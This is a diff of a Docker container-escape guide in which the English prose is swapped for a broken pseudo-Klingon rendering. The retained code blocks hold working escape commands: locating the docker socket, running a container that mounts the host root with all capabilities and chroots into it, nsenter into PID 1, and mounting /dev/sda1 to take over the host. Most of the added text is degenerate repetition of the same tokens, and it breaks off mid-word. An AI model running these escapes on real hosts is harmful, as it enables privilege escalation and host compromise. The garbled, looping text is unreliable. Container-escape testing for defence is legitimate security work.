@@ -34,15 +34,17 @@ Get Access Today:
 
 If somehow you find that the **docker socket is mounted** inside the docker container, you will be able to escape from it.\
 This usually happen in docker containers that for some reason need to connect to docker daemon to perform actions.
-
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
 #It's usually in /run/docker.sock
 ```
+**In this case you can use regular docker commands to communicate with the docker daemon:**
 
-In this case you can use regular docker commands to communicate with the docker daemon:
+**Klingon Translation:**
 
+**vaj vItlhutlh:**
+Docker daemon vItlhutlh vaj Docker commands regular vaj.
 ```bash
 #List images to use one
 docker images
@@ -56,99 +58,35 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 # Get full privs in container without --privileged
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
-
 {% hint style="info" %}
-In case the **docker socket is in an unexpected place** you can still communicate with it using the **`docker`** command with the parameter **`-H unix:///path/to/docker.sock`**
-{% endhint %}
-
-Docker daemon might be also [listening in a port (by default 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) or on Systemd-based systems, communication with the Docker daemon can occur over the Systemd socket `fd://`.
-
-{% hint style="info" %}
-Additionally, pay attention to the runtime sockets of other high-level runtimes:
-
-* dockershim: `unix:///var/run/dockershim.sock`
-* containerd: `unix:///run/containerd/containerd.sock`
-* cri-o: `unix:///var/run/crio/crio.sock`
-* frakti: `unix:///var/run/frakti.sock`
-* rktlet: `unix:///var/run/rktlet.sock`
-* ...
-{% endhint %}
-
-## Capabilities Abuse Escape
-
-You should check the capabilities of the container, if it has any of the following ones, you might be able to scape from it: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
-
-You can check currently container capabilities using **previously mentioned automatic tools** or:
-
+**Docker** **socket** **vItlhutlh** **unexpected** **place** **case** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **
 ```bash
 capsh --print
 ```
-
-In the following page you can **learn more about linux capabilities** and how to abuse them to escape/escalate privileges:
-
-{% content-ref url="../../linux-capabilities.md" %}
-[linux-capabilities.md](../../linux-capabilities.md)
-{% endcontent-ref %}
-
-## Escape from Privileged Containers
-
-A privileged container can be created with the flag `--privileged` or disabling specific defenses:
-
-* `--cap-add=ALL`
-* `--security-opt apparmor=unconfined`
-* `--security-opt seccomp=unconfined`
-* `--security-opt label:disable`
-* `--pid=host`
-* `--userns=host`
-* `--uts=host`
-* `--cgroupns=host`
-* `Mount /dev`
-
-The `--privileged` flag significantly lowers container security, offering **unrestricted device access** and bypassing **several protections**. For a detailed breakdown, refer to the documentation on `--privileged`'s full impacts.
-
-{% content-ref url="../docker-privileged.md" %}
-[docker-privileged.md](../docker-privileged.md)
-{% endcontent-ref %}
-
-### Privileged + hostPID
-
-With these permissions you can just **move to the namespace of a process running in the host as root** like init (pid:1) just running: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
-
-Test it in a container executing:
-
+**qaStaHvIS linux capabilities** 'ej chel abuse 'oH 'ej 'oH 'ej 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'o
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
+### Qa'vIn
 
-### Privileged
+**privileged** qutlh **flag** vItlhutlh **host's disk** qurgh **access** 'ej **escape abusing release\_agent or other escapes** **try** vItlhutlh.
 
-Just with the privileged flag you can try to **access the host's disk** or try to **escape abusing release\_agent or other escapes**.
-
-Test the following bypasses in a container executing:
-
+container executing vItlhutlh **bypasses** **following** **Test**:
 ```bash
 docker run --rm -it --privileged ubuntu bash
 ```
+#### Disk yIqem - Poc1
 
-#### Mounting Disk - Poc1
-
-Well configured docker containers won't allow command like **fdisk -l**. However on miss-configured docker command where the flag `--privileged` or `--device=/dev/sda1` with caps is specified, it is possible to get the privileges to see the host drive.
+Docker containers Daq yIqem Hoch **fdisk -l** command jatlhlaHbe'. 'ejwI' 'e' vItlhutlh **--privileged** yIlo' **--device=/dev/sda1** jatlhlaHbe' 'ej yIlo' caps, 'oH vItlhutlh vItlhutlh host drive qar'a'.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
 So to take over the host machine, it is trivial:
-
 ```bash
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
-
-And voilà ! You can now access the filesystem of the host because it is mounted in the `/mnt/hola` folder.
-
-#### Mounting Disk - Poc2
-
-Within the container, an attacker may attempt to gain further access to the underlying host OS via a writable hostPath volume created by the cluster. Below is some common things you can check within the container to see if you leverage this attacker vector:
-
+ghobe' ! jImejqa'pu' ! nuqneH 'oH vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vIt
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -169,10 +107,7 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
-
-#### Privileged Escape Abusing existent release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
-
-{% code title="Initial PoC" %}
+#### qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej 